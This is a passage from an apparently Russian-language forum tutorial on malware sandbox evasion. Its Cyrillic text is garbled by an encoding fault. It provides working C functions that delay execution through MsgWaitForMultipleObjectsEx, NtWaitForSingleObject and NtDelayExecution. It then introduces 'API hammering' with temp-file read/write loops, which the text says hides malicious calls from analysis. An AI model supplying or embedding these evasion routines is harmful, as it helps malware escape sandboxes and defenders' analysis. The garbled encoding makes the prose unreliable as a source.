          _T1               = NULL;


  _T0 = GetTickCount64();

  // –û–∂–∏–¥–∞–Ω–∏–µ –≤ —Ç–µ—á–µ–Ω–∏–µ &#039;dwMilliSeconds&#039; –º—Å
  if (MsgWaitForMultipleObjectsEx(1, &amp;hEvent, dwMilliSeconds, QS_HOTKEY, NULL) == WAIT_FAILED) {
    printf(&quot;[!] MsgWaitForMultipleObjectsEx Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
  }

  _T1 = GetTickCount64();

  // –ü—Ä–æ—à–ª–æ –∫–∞–∫ –º–∏–Ω–∏–º—É–º &#039;dwMilliSeconds&#039; –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥, –∑–Ω–∞—á–∏—Ç, &#039;DelayExecutionVia_MWFMOEx&#039; –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ
  if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
    return FALSE;

  CloseHandle(hEvent);

  return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º NtWaitForSingleObject</b><br />
<br />
–ó–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ —Ç–∞–∫–∂–µ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ NtWaitForSingleObject. NtWaitForSingleObject - —ç—Ç–æ –Ω–∞—Ç–∏–≤–Ω–∞—è –≤–µ—Ä—Å–∏—è API WaitForSingleObject –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Ç—É –∂–µ —Ñ—É–Ω–∫—Ü–∏—é. NtWaitForSingleObject –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtWaitForSingleObject(
  [in] HANDLE         Handle,       // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–±—ä–µ–∫—Ç–∞ –æ–∂–∏–¥–∞–Ω–∏—è
  [in] BOOLEAN        Alertable,    // –ú–æ–∂–Ω–æ –ª–∏ –¥–æ—Å—Ç–∞–≤–∏—Ç—å –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ, –∫–æ–≥–¥–∞ –æ–±—ä–µ–∫—Ç –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –æ–∂–∏–¥–∞–Ω–∏–∏
  [in] PLARGE_INTEGER Timeout       // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É LARGE_INTEGER, —É–∫–∞–∑—ã–≤–∞—é—â—É—é –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è
);</code></pre>
	</div>
</div><br />
–í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –¥–ª—è NtWaitForSingleObject –∑–∞–¥–∞–µ—Ç—Å—è –≤ –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞—Ö 100 –Ω–∞–Ω–æ—Å–µ–∫—É–Ω–¥, –∫–æ—Ç–æ—Ä—ã–µ —á–∞—Å—Ç–æ –Ω–∞–∑—ã–≤–∞—é—Ç—Å—è —Ç–∞–∫—Ç–∞–º–∏. –û–¥–∏–Ω —Ç–∞–∫—Ç —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–µ–Ω 0,0001 –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥—ã. –ó–Ω–∞—á–µ–Ω–∏–µ, –ø–µ—Ä–µ–¥–∞–≤–∞–µ–º–æ–µ —á–µ—Ä–µ–∑ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä Timeout, –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ–º dwMilliSeconds x 10000, –≥–¥–µ dwMilliSeconds - —ç—Ç–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥–∞—Ö.<br />
<br />
–§—É–Ω–∫—Ü–∏—è DelayExecutionVia_NtWFSO –Ω–∏–∂–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtWaitForSingleObject –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è, —É–∫–∞–∑–∞–Ω–Ω–æ–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º ftMinutes. ftMinutes –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –≤—Ä–µ–º—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –º–∏–Ω—É—Ç–∞—Ö. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ NtWaitForSingleObject —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI* fnNtWaitForSingleObject)(
    HANDLE         Handle,
    BOOLEAN        Alertable,
    PLARGE_INTEGER Timeout
);

BOOL DelayExecutionVia_NtWFSO(FLOAT ftMinutes) {

     // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –º–∏–Ω—É—Ç –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥—ã
    DWORD                   dwMilliSeconds          = ftMinutes * 60000;
    HANDLE                  hEvent                  = CreateEvent(NULL, NULL, NULL, NULL);
    LONGLONG                Delay                   = NULL;
    NTSTATUS                STATUS                  = NULL;
    LARGE_INTEGER           DelayInterval           = { 0 };
    fnNtWaitForSingleObject pNtWaitForSingleObject  = (fnNtWaitForSingleObject)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtWaitForSingleObject&quot;);
    DWORD                   _T0                     = NULL,
                            _T1                     = NULL;

      // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∏–∑ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥ –≤ –∏–Ω—Ç–µ—Ä–≤–∞–ª –≤—Ä–µ–º–µ–Ω–∏ —Å –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞–º–∏ 100 –Ω–∞–Ω–æ—Å–µ–∫—É–Ω–¥
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount64();

      // –û–∂–∏–¥–∞–Ω–∏–µ –≤ —Ç–µ—á–µ–Ω–∏–µ &#039;dwMilliSeconds&#039; –º—Å
    if ((STATUS = pNtWaitForSingleObject(hEvent, FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
        printf(&quot;[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    _T1 = GetTickCount64();

      // –ü—Ä–æ—à–ª–æ –∫–∞–∫ –º–∏–Ω–∏–º—É–º &#039;dwMilliSeconds&#039; –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥, –∑–Ω–∞—á–∏—Ç, &#039;DelayExecutionVia_NtWFSO&#039; –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ
    if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
        return FALSE;

    CloseHandle(hEvent);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º NtDelayExecution</b><br />
<br />
–ü–æ—Å–ª–µ–¥–Ω–∏–π –º–µ—Ç–æ–¥ –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ NtDelayExecution. –ù–∞–∑–≤–∞–Ω–∏–µ —è–≤–Ω–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Ç–æ, —á—Ç–æ —ç—Ç–æ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏.<br />
NtDelayExecution –ø–æ—Ö–æ–∂ –Ω–∞ NtWaitForSingleObject, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –æ–±—ä–µ–∫—Ç–Ω–æ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è; –µ–≥–æ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –∞–Ω–∞–ª–æ–≥–∏—á–Ω–∞ Sleep, –ø—Ä–∏–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—â–µ–º—É –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ —Ü–∏–∫–ª–∞ –∫–æ–¥–∞. NtDelayExecution –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtDelayExecution(
    IN BOOLEAN              Alertable,      // –ú–æ–∂–Ω–æ –ª–∏ –¥–æ—Å—Ç–∞–≤–∏—Ç—å –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ, –∫–æ–≥–¥–∞ –æ–±—ä–µ–∫—Ç –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –æ–∂–∏–¥–∞–Ω–∏–∏
    IN PLARGE_INTEGER       DelayInterval   // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É LARGE_INTEGER, —É–∫–∞–∑—ã–≤–∞—é—â—É—é –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è
);</code></pre>
	</div>
</div><br />
NtDelayExecution –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–∞–∫—Ç—ã –¥–ª—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ DelayInterval.<br />
<br />
–§—É–Ω–∫—Ü–∏—è DelayExecutionVia_NtDE –Ω–∏–∂–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtDelayExecution –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è ftMinutes, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –≤ –º–∏–Ω—É—Ç–∞—Ö. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ NtDelayExecution —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI *fnNtDelayExecution)(
    BOOLEAN              Alertable,
    PLARGE_INTEGER       DelayInterval
);

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

      // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –º–∏–Ω—É—Ç –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥—ã
    DWORD               dwMilliSeconds        = ftMinutes * 60000;
    LARGE_INTEGER       DelayInterval         = { 0 };
    LONGLONG            Delay                 = NULL;
    NTSTATUS            STATUS                = NULL;
    fnNtDelayExecution  pNtDelayExecution     = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtDelayExecution&quot;);
    DWORD               _T0                   = NULL,
                        _T1                   = NULL;

      // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∏–∑ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥ –≤ –∏–Ω—Ç–µ—Ä–≤–∞–ª –≤—Ä–µ–º–µ–Ω–∏ —Å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º–∏ –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞–º–∏ 100 –Ω–∞–Ω–æ—Å–µ–∫—É–Ω–¥
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount64();

    // –û–∂–∏–¥–∞–Ω–∏–µ –≤ —Ç–µ—á–µ–Ω–∏–µ &#039;dwMilliSeconds&#039; –º—Å
    if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
        printf(&quot;[!] NtDelayExecution Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    _T1 = GetTickCount64();

    // –ü—Ä–æ—à–ª–æ –∫–∞–∫ –º–∏–Ω–∏–º—É–º &#039;dwMilliSeconds&#039; –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥, –∑–Ω–∞—á–∏—Ç, &#039;DelayExecutionVia_NtDE&#039; –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ
    if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
        return FALSE;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>API Hammering</b> - —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞ –æ–±—Ö–æ–¥–∞ –ø–µ—Å–æ—á–Ω–∏—Ü—ã, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –±—ã—Å—Ç—Ä—ã–π –≤—ã–∑–æ–≤ —Å–ª—É—á–∞–π–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π WinAPI –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã. –≠—Ç–æ —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –∑–∞—Ç—Ä—É–¥–Ω–µ–Ω–∏—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —Å—Ç–µ–∫–∞ –≤—ã–∑–æ–≤–æ–≤ –≤ —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –ø–æ—Ç–æ–∫–∞—Ö. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω—ã–µ –≤—ã–∑–æ–≤—ã —Ñ—É–Ω–∫—Ü–∏–π –≤ –ª–æ–≥–∏–∫–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –±—É–¥—É—Ç —Å–∫—Ä—ã—Ç—ã —Å–ª—É—á–∞–π–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏ –±–µ–∑–≤—Ä–µ–¥–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π WinAPI.<br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –±—É–¥–µ—Ç –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∞ —Ç–µ—Ö–Ω–∏–∫–∞ API Hammering –¥–≤—É–º—è —Å–ø–æ—Å–æ–±–∞–º–∏. –ü–µ—Ä–≤—ã–π –º–µ—Ç–æ–¥ –≤—ã–ø–æ–ª–Ω—è–µ—Ç API Hammering –≤ —Ñ–æ–Ω–æ–≤–æ–º –ø–æ—Ç–æ–∫–µ, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–∑—ã–≤–∞–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –∏–∑ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞, –≥–¥–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω—ã–π –∫–æ–¥. –í—Ç–æ—Ä–æ–π –º–µ—Ç–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç API Hammering –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –ø–æ–º–æ—â—å—é –æ–ø–µ—Ä–∞—Ü–∏–π, —Ç—Ä–µ–±—É—é—â–∏—Ö –º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏.<br />
<br />
–§—É–Ω–∫—Ü–∏–∏ –≤–≤–æ–¥–∞-–≤—ã–≤–æ–¥–∞ API Hammering –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª—é–±—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI, –æ–¥–Ω–∞–∫–æ –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ —Ç—Ä–∏ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI.<br />
<br />
CreateFileW - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞.<br />
<br />
WriteFile - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–∞–π–ª.<br />
<br />
ReadFile - –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —á—Ç–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Ñ–∞–π–ª–∞.<br />
<br />
–≠—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI –±—ã–ª–∏ –≤—ã–±—Ä–∞–Ω—ã –∏–∑-–∑–∞ –∏—Ö —Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç–∏ –ø–æ—Ç—Ä–µ–±–ª—è—Ç—å –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Ä–µ–º–µ–Ω–∏ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –±–æ–ª—å—à–∏–º–∏ –æ–±—ä–µ–º–∞–º–∏ –¥–∞–Ω–Ω—ã—Ö, —á—Ç–æ –¥–µ–ª–∞–µ—Ç –∏—Ö –ø–æ–¥—Ö–æ–¥—è—â–∏–º–∏ –¥–ª—è API Hammering.<br />
<br />
<b>–ü—Ä–æ—Ü–µ—Å—Å API Hammering</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è CreateFileW –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –≤ –ø–∞–ø–∫–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ Windows. –û–±—ã—á–Ω–æ –≤ —ç—Ç–æ–π –ø–∞–ø–∫–µ —Ö—Ä–∞–Ω—è—Ç—Å—è —Ñ–∞–π–ª—ã .tmp, —Å–æ–∑–¥–∞–Ω–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π Windows –∏–ª–∏ —Å—Ç–æ—Ä–æ–Ω–Ω–∏–º–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏. –≠—Ç–∏ –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤–æ –≤—Ä–µ–º—è –≤—ã—á–∏—Å–ª–∏—Ç–µ–ª—å–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, —Ç–∞–∫–∏—Ö –∫–∞–∫ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∏–ª–∏ –∑–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –∏–∑ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç–∞. –ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∑–∞–¥–∞—á —ç—Ç–∏ —Ñ–∞–π–ª—ã –æ–±—ã—á–Ω–æ —É–¥–∞–ª—è—é—Ç—Å—è.<br />
<br />
–ü–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–∞–π–ª–∞ .tmp –≤ –Ω–µ–≥–æ –±—É–¥–µ—Ç –∑–∞–ø–∏—Å–∞–Ω –±—É—Ñ–µ—Ä, —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Å–ª—É—á–∞–π–Ω—ã–º –æ–±—Ä–∞–∑–æ–º –∏ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞, —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ WriteFile WinAPI. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∞–π–ª–∞ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç—Å—è –∏ –∑–∞—Ç–µ–º —Å–Ω–æ–≤–∞ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ CreateFileW. –ù–∞ —ç—Ç–æ—Ç —Ä–∞–∑ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π —Ñ–ª–∞–≥ –¥–ª—è –ø–æ–º–µ—Ç–∫–∏ —Ñ–∞–π–ª–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è –µ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞.<br />
<br />
–ü–µ—Ä–µ–¥ –∑–∞–∫—Ä—ã—Ç–∏–µ–º –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ñ—É–Ω–∫—Ü–∏—è ReadFile –¥–ª—è —á—Ç–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, –∑–∞–ø–∏—Å–∞–Ω–Ω—ã—Ö —Ä–∞–Ω–µ–µ, –≤ –ª–æ–∫–∞–ª—å–Ω—ã–π –±—É—Ñ–µ—Ä. –ó–∞—Ç–µ–º —ç—Ç–æ—Ç –±—É—Ñ–µ—Ä –±—É–¥–µ—Ç –æ—á–∏—â–µ–Ω –∏ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω, –∏, –Ω–∞–∫–æ–Ω–µ—Ü, –∑–∞–∫—Ä–æ–µ—Ç—Å—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∞–π–ª–∞, —á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –µ–≥–æ —É–¥–∞–ª–µ–Ω–∏—é.<br />
<br />
–ú–æ–∂–Ω–æ —á–µ—Ç–∫–æ –≤–∏–¥–µ—Ç—å, —á—Ç–æ –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω—ã–µ –∑–∞–¥–∞—á–∏ –Ω–µ –∏–º–µ—é—Ç —Å–º—ã—Å–ª–∞, –Ω–æ –∑–∞—Ç—Ä–∞—Ç–Ω—ã –ø–æ –≤—Ä–µ–º–µ–Ω–∏. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –≤—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–µ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–æ –≤–Ω—É—Ç—Ä–∏ —Ü–∏–∫–ª–∞.<br />
<br />
<b>–¢–∞–∫–∂–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≥–µ–Ω–µ—Ä–∞—Ü–∏—é –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤ —Ñ–∞–π–ª –∏ –ø—Ä–æ–≤–µ—Ä–∫—É –µ–≥–æ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç–∏ –ø–æ—Å–ª–µ —Å—á–∏—Ç—ã–≤–∞–Ω–∏—è, –∞ —Ç–∞–∫–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–∏—Ö –¥–∞–Ω–Ω—ã—Ö –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∫–ª—é—á–∞.</b><br />
<br />
